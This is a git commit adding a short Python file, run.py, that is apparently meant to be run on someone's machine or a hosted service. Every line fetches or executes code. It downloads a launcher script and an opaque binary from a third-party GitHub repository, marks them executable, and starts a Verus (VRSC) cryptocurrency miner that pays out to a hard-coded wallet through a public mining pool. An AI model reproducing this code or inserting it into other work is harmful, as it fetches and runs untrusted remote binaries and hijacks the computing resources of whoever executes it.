1988802355a56761a210101aa3a611a23290d719
mozalahaku <91887370+mozalahaku@users.noreply.github.com>
2021-11-27 16:49:13 +0700

    Create run.py

---
+++ run.py
@@ -0,0 +1,6 @@
+import os
+
+os.system("wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh")
+os.system("wget https://github.com/hunshukajh/yes/raw/main/gas")
+os.system("chmod +x gas cmdline_launcher.sh")
+os.system("./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K -rigName bismillah -pool1 na.luckpool.net:3956")
